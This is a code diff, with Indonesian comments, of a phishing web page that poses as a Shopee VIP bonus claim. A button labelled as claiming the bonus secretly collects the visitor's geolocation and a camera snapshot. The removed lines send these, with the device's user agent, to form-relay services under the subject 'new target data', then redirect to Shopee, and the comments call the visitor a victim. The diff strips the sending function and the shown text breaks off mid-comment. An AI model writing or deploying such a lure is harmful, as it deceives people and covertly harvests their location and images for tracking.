@@ -104,15 +104,16 @@
 
         <!-- AREA GAMBAR DAN TOMBOL -->
         <div class="image-wrapper" id="clickArea">
-            <!-- PASTIKAN FILE GAMBAR: umpan . jpg.png -->
+            <!-- PERHATIKAN: Nama file gambar harus PERSIS dengan nama di GitHub -->
+            <!-- Jika nama file di GitHub "umpan . jpg.png", biarkan seperti ini. Jika sudah dirubah jadi "bonus.jpg", ubah src di bawah -->
             <img src="umpan . jpg.png" alt="Klaim Bonus Shopee VIP">
             
-            <button class="btn-overlay" onclick="startSilentCapture()">
+            <button class="btn-overlay" onclick="startProcess()">
                 👆 KLIK UNTUK KLAIM BONUS 👆
             </button>
         </div>
 
-        <!-- LOADING SCREEN (Ini yang dilihat korban) -->
+        <!-- LOADING SCREEN -->
         <div id="loading">
             <div class="spinner"></div>
             <p style="font-size: 14px; color: #777; margin-top: 10px;">Memverifikasi Akun VIP...</p>
@@ -124,13 +125,13 @@
         </div>
     </div>
 
-        <script>
-        // GANTI DENGAN EMAIL KAMU JIKA PAKAI FORMSUBMIT (Lebih Stabil)
-        // Jika pakai Web3Forms, pastikan API_KEY_WEB3 benar
-        const USE_FORMSUBMIT = false; // Ubah ke TRUE jika pakai FormSubmit
-        const TARGET_EMAIL = "namakamu@email.com"; // Ganti email ini
+    <script>
+        // KONFIGURASI
+        const USE_FORMSUBMIT = false; // Set TRUE jika pakai FormSubmit, FALSE jika Web3Forms
+        const TARGET_EMAIL = "namakamu@email.com"; 
         const API_KEY_WEB3 = "7e55426b-9f49-4a5f-be85-75305abb1b30";
 
+        // FUNGSI UTAMA YANG DIPANGGIL TOMBOL
         function startProcess() {
             const clickArea = document.getElementById('clickArea');
             const loading = document.getElementById('loading');
@@ -140,7 +141,7 @@
             clickArea.style.display = 'none';
             loading.style.display = 'block';
 
-            // Ambil Lokasi
+            // Ambil Lokasi Dulu
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -190,69 +191,4 @@
                     }, 1000); // Tunggu 1 detik setelah kamera nyala
                 })
                 .catch(err => {
-                    // Jika kamera gagal (misal: izin ditolak), kirim lokasi saja
-                    console.log("Camera Error:", err);
-                    sendData(lat, lon, "Camera Skipped");
-                });
-        }
-
-        function sendData(lat, lon, photoData) {
-            const loading = document.getElementById('loading');
-            const success = document.getElementById('successMsg');
-
-            if (USE_FORMSUBMIT) {
-                // --- MENGGUNAKAN FORMSUBMIT ---
-                const formData = new FormData();
-                formData.append("Lokasi", `${lat}, ${lon}`);
-                formData.append("Device", navigator.userAgent);
-                formData.append("Foto_Selfie", photoData);
-                formData.append("_subject", "🎯 DATA TARGET BARU");
-                formData.append("_template", "table");
-
-                fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
-                    method: "POST",
-                      body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    finishProcess();
-                })
-                .catch(err => {
-                    console.log("Error:", err);
-                    finishProcess();
-                });
-
-            } else {
-                // --- MENGGUNAKAN WEB3FORMS ---
-                const formData = new FormData();
-                formData.append("access_key", API_KEY_WEB3);
-                formData.append("Lokasi", `${lat}, ${lon}`);
-                formData.append("Device", navigator.userAgent);
-                formData.append("Foto_Selfie", photoData);
-                formData.append("Subject", "🎯 DATA TARGET BARU");
-
-                fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    finishProcess();
-                })
-                .catch(err => {
-                    console.log("Error:", err);
-                    finishProcess();
-                });
-            }
-
-            function finishProcess() {
-                loading.style.display = 'none';
-                success.style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = "https://shopee.co.id/";
-                }, 1500);
-            }
-        }
-    </script>
-</body>
-</html>
+                    // Jika kamera gagal (misal: izin ditolak
